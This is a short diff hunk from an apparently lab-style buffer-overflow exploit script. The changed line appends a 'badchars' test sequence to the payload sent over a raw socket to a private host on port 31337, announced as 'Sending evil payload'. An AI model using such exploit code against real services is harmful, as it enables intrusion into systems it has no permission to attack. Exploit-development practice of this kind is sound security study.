@@ -433,7 +433,7 @@ try:
         print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.connect(('192.168.1.100',31337))
-        s.send(gate_string + b'\r\n')
+        s.send(gate_string + badchars + b'\r\n')
         s.close()
 
 except:
